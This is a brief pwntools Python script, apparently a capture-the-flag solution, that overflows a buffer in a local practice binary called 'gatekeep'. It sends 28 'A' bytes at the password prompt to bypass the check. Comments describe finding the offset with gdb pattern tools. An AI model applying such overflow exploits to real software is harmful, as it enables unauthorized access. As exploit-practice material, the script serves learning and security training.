#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./gatekeep")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"Password:\n")
# Use `pattern create 48` and `pattern offset` to find the buffer size
# using the value in $rbp at the cmp instruction
# 31 - 4 = 27
r.sendline(b"A" * 28)

r.interactive()